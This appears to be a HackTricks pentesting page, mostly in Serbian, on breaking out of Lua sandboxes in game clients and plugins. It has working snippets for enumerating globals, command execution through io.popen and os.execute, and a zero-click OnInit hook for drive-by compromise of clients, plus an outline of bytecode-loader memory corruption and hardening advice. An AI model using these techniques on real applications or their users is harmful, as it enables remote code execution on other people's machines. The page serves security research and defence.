# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ova stranica prikuplja praktične tehnike za enumeraciju i izlazak iz Lua "sandboxes" ugrađenih u aplikacije (naročito game clients, plugins ili in-app scripting engines). Mnogi engines izlažu ograničeno Lua okruženje, ali ostavljaju dostupne moćne globalne promenljive koje omogućavaju proizvoljno izvršavanje komandi ili čak native memory corruption kada su bytecode loaders izloženi.

Ključne ideje:
- Tretirajte VM kao nepoznato okruženje: enumerišite _G i otkrijte koji su opasni primitives dostupni.
- Kada su stdout/print blokirani, zloupotrebite bilo koji in-VM UI/IPC kanal kao output sink da biste posmatrali rezultate.
- Ako su io/os izloženi, često imate direktno command execution (io.popen, os.execute).
- Ako su load/loadstring/loadfile izloženi, izvršavanje pažljivo kreiranog Lua bytecode-a može ugroziti memory safety u nekim verzijama (verifiers u verzijama ≤5.1 mogu se zaobići; 5.2 je uklonio verifier), što omogućava naprednu exploitation.

## Enumerate the sandboxed environment

- Dump globalnog okruženja radi popisivanja dostupnih tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ako print() nije dostupan, prenamenite kanale unutar VM-a. Primer iz VM-a za skripte stambenog sistema u MMO igri, gde izlaz za chat funkcioniše tek nakon poziva zvuka; sledeće kreira pouzdanu izlaznu funkciju:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizujte ovaj obrazac za svoj cilj: svaki textbox, toast, logger ili UI callback koji prihvata stringove može da posluži kao stdout za izviđanje.

## Direktno izvršavanje komandi ako su io/os izloženi

Ako sandbox i dalje izlaže standardne biblioteke io ili os, verovatno odmah imate command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Napomene:

- Izvršavanje se odvija unutar klijentskog procesa; mnogi anti-cheat/antidebug slojevi koji blokiraju eksterne debuggere neće sprečiti kreiranje procesa unutar VM-a.
- Takođe proverite: package.loadlib (učitavanje proizvoljnih DLL/.so datoteka), require sa native modulima, LuaJIT-ov ffi (ako postoji) i debug biblioteku (može podići privilegije unutar VM-a).

## Triggeri bez klika putem auto-run callback-ova

Ako host aplikacija prosleđuje skripte klijentima, a VM izlaže auto-run hook-ove (npr. OnInit/OnLoad/OnEnter), postavite svoj payload tamo radi drive-by kompromitacije čim se skripta učita:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Bilo koji ekvivalentni callback (OnLoad, OnEnter itd.) generalizuje ovu tehniku kada se scripts automatski prenose i izvršavaju na klijentu.

## Opasne primitive koje treba tražiti tokom recon-a

Tokom enumeracije _G posebno tražite:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: izvršavanje source-a ili bytecode-a; podržava učitavanje nepouzdanog bytecode-a.
- package, package.loadlib, require: učitavanje dinamičkih biblioteka i module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo i hooks.
- LuaJIT-only: ffi.cdef, ffi.load za direktno pozivanje native code-a.

Minimalni primeri upotrebe (ako su dostupni):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opciono eskaliranje: zloupotreba Lua bytecode loadera

Kada su load/loadstring/loadfile dostupni, ali su io/os ograničeni, izvršavanje kreiranog Lua bytecode-a može dovesti do primitiva za otkrivanje i korupciju memorije. Ključne činjenice:
- Lua ≤ 5.1 je imala ugrađeni bytecode verifier koji je poznato moguće zaobići.<sup>[[4]](#references)</sup>
- Lua 5.2 je u potpunosti uklonila verifier (zvanični stav: aplikacije bi jednostavno trebalo da odbiju precompiled chunks), čime se proširuje attack surface ako učitavanje bytecode-a nije zabranjeno.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflow obično obuhvata: leak pointera putem izlaza unutar VM-a, kreiranje bytecode-a radi izazivanja type confusion-a (npr. oko FORLOOP ili drugih opcode-ova), a zatim prelazak na proizvoljno čitanje/upis ili izvršavanje native code-a.<sup>[[2]](#references)[[4]](#references)</sup>

Ovaj put je specifičan za engine/verziju i zahteva RE. Pogledajte references za detaljne analize, exploitation primitive i primere gadgetry-ja u igrama.

## Napomene o detekciji i hardening-u (za defendere)

- Server side: odbacite ili prepišite user scripts; dozvolite samo safe APIs; uklonite ili povežite sa praznim vrednostima io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: pokrenite Lua sa minimalnim _ENV, zabranite učitavanje bytecode-a, ponovo uvedite strict bytecode verifier ili signature checks i blokirajte kreiranje procesa iz client procesa.
- Telemetrija: generišite alert na kreiranje child process-a iz gameclient-a ubrzo nakon učitavanja script-a; korelišite to sa UI/chat/script događajima.

## References

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
